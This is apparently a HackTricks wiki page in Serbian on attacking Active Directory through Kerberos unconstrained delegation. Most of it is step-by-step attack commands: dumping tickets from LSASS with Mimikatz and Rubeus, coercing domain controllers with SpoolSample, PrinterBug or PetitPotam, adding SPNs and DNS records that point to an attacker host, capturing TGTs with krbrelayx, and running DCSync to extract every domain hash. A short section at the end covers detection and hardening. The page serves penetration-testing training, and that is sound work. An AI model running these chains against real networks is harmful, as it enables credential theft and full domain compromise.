# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Ovo je funkcija koju Domain Administrator može da podesi za bilo koji **Computer** unutar domena. Zatim, svaki put kada se **user prijavi** na Computer, **kopija TGT-a** tog user-a biće **poslata unutar TGS-a** koji obezbeđuje DC i **sačuvana u memoriji u LSASS-u**. Dakle, ako imate Administrator privilegije na mašini, moći ćete da **dump-ujete tikete i impersonirate user-e** na bilo kojoj mašini.

Dakle, ako se domain admin prijavi na Computer sa aktiviranom funkcijom „Unconstrained Delegation“, a vi imate lokalne admin privilegije na toj mašini, moći ćete da dump-ujete tiket i impersonirate Domain Admin bilo gde (domain privesc).

Možete **pronaći Computer objekte sa ovim atributom** tako što ćete proveriti da li atribut [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) sadrži [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). To možete uraditi pomoću LDAP filtera ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, što radi powerview:

```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```

Učitaj tiket Administratora (ili korisnika žrtve) u memoriju pomoću **Mimikatz** ili **Rubeus** za [**Pass the Ticket**](pass-the-ticket.md)**.**\
Više informacija: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**Više informacija o Unconstrained delegation u ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Prinudna autentifikacija**

Ako napadač uspe da **kompromituje računar kojem je dozvoljena „Unconstrained Delegation“**, mogao bi da **prevari** **server za štampanje** da se **automatski prijavi** na njega i **sačuva TGT** u memoriji servera.\
Zatim bi napadač mogao da izvede **Pass the Ticket napad kako bi se lažno predstavio** kao računarski nalog servera za štampanje.

Da bi se server za štampanje prijavio na bilo koju mašinu, možete da koristite [**SpoolSample**](https://github.com/leechristensen/SpoolSample):

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

Ako je TGT od kontrolera domena, možete izvršiti [**DCSync napad**](acl-persistence-abuse/index.html#dcsync) i pribaviti sve hash vrednosti sa DC-a.\
[**Više informacija o ovom napadu na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Ovde pronađite druge načine da **iznudite autentifikaciju:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Radi i bilo koji drugi coercion primitive koji navede žrtvu da se autentifikuje putem **Kerberos** protokola na vaš host sa unconstrained delegation. U modernim okruženjima to često znači zamenu klasičnog PrinterBug toka sa **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** ili coercion-om zasnovanim na **WebClient/WebDAV**, u zavisnosti od toga koja RPC površina je dostupna.

### Zloupotreba korisničkog/servisnog naloga sa unconstrained delegation

Unconstrained delegation **nije ograničen samo na računarske objekte**. **Korisnički/servisni nalog** takođe može biti konfigurisan kao `TRUSTED_FOR_DELEGATION`. U tom slučaju, praktični uslov je da nalog mora da prima Kerberos servisne tikete za **SPN koji poseduje**.

Ovo vodi do 2 veoma česta ofanzivna puta:

1. Kompromitujete lozinku/hash **korisničkog naloga** sa unconstrained delegation, a zatim **dodate SPN** tom istom nalogu.
2. Nalog već ima jedan ili više SPN-ova, ali jedan od njih pokazuje na **zastarelo/uklonjeno ime hosta**; ponovno kreiranje nedostajućeg **DNS A zapisa** dovoljno je da preotmete tok autentifikacije bez izmena skupa SPN-ova.<sup>[[8]](#references)</sup>

Minimalni Linux tok:

```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
  secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```

Beleške:

- Ovo je naročito korisno kada je principal sa **Unconstrained Delegation** nalog za **service account** i imate samo njegove akreditive, a ne i mogućnost izvršavanja koda na pridruženom hostu.
- Ako ciljni korisnik već ima **zastareli SPN**, ponovno kreiranje odgovarajućeg **DNS zapisa** može biti manje upadljivo nego upisivanje novog SPN-a u AD.
- Novije tradecraft tehnike usmerene na Linux koriste `addspn.py`, `dnstool.py`, `krbrelayx.py` i jednu coercion primitivu; ne morate da pristupite Windows hostu da biste dovršili lanac napada.

### Zloupotreba Unconstrained Delegation pomoću računara koji je kreirao napadač

Moderni domeni često imaju `MachineAccountQuota > 0` (podrazumevano 10), što svakom autentifikovanom principalu omogućava da kreira do N računarskih objekata. Ako imate i privilegiju tokena `SeEnableDelegationPrivilege` (ili ekvivalentna prava), možete podesiti da novokreirani računar bude pouzdan za Unconstrained Delegation i prikupljati dolazne TGT-ove sa privilegovanih sistema.<sup>[[1]](#references)</sup>

Tok na visokom nivou:

1) Kreirajte računar koji kontrolišete

```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```

2) Omogućite razrešavanje lažnog imena hosta unutar domena

```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
  --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
  -dns-ip <DC_IP> <DC_FQDN>
```

3) Omogućite Unconstrained Delegation na računaru koji kontroliše napadač

```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```

Zašto ovo funkcioniše: uz unconstrained delegation, LSA na računaru sa omogućenim delegiranjem kešira dolazne TGT-ove. Ako prevarite DC ili privilegovani server da se autentifikuje na vaš lažni host, njegov mašinski TGT će biti sačuvan i može se izvesti.

4) Pokrenite krbrelayx u export režimu i pripremite Kerberos materijal

```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```

5) Naterajte DC/servere da se autentifikuju na vašem lažnom hostu

```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```

krbrelayx će sačuvati ccache datoteke kada se računar autentifikuje, na primer:

```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```

6) Upotrebite uhvaćeni TGT DC mašine za izvršavanje DCSync-a.

```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Beleške i zahtevi:

- `MachineAccountQuota > 0` omogućava kreiranje računara bez privilegija; u suprotnom su potrebna eksplicitna prava.
- Za postavljanje `TRUSTED_FOR_DELEGATION` na računaru potreban je `SeEnableDelegationPrivilege` (ili domain admin).
- Obezbedite razrešavanje imena ka vašem lažnom hostu (DNS A zapis) kako bi DC mogao da mu pristupi preko FQDN-a.
- Prinuda zahteva odgovarajući vektor (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN itd.). Ako je moguće, onemogućite ih na DC-ovima.
- Ako je nalog žrtve označen kao **„Nalog je osetljiv i ne može se delegirati“** ili je član grupe **Protected Users**, prosleđeni TGT neće biti uključen u servisnu kartu, pa ovaj lanac neće omogućiti dobijanje TGT-a koji se može ponovo upotrebiti.<sup>[[9]](#references)</sup>
- Ako je **Credential Guard** omogućen na klijentu/serveru koji obavlja autentifikaciju, Windows blokira **Kerberos unconstrained delegation**, zbog čega vektori prinude koji bi inače bili ispravni mogu da zakažu sa stanovišta operatera.

Ideje za detekciju i ojačavanje bezbednosti:

- Generišite upozorenje za Event ID 4741 (kreiran je račun računara) i 4742/4738 (izmenjen je račun računara/korisnika) kada je postavljen UAC `TRUSTED_FOR_DELEGATION`.
- Pratite neuobičajena dodavanja DNS A zapisa u zoni domena.
- Pratite porast broja događaja 4768/4769 sa neočekivanih hostova i autentifikacije DC-ova ka hostovima koji nisu DC-ovi.
- Ograničite `SeEnableDelegationPrivilege` na najmanji mogući skup, postavite `MachineAccountQuota=0` gde je to izvodljivo i onemogućite Print Spooler na DC-ovima. Sprovodite LDAP signing i channel binding.

### Ublažavanje

- Ograničite DA/Admin prijavljivanja na određene servise.
- Za privilegovane naloge postavite opciju „Nalog je osetljiv i ne može se delegirati“.

## References

- [1] [HTB: Delegate — kredencijali SYSVOL-a → Targeted Kerberoast → Unconstrained Delegation → DCSync do DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Kompromitovanje domena putem neograničene delegacije](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation u Active Directory-ju](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Bezbednosna grupa Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Kompromitovanje domena preko DC print servera i Kerberos delegacije](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
{{#include ../../banners/hacktricks-training.md}}
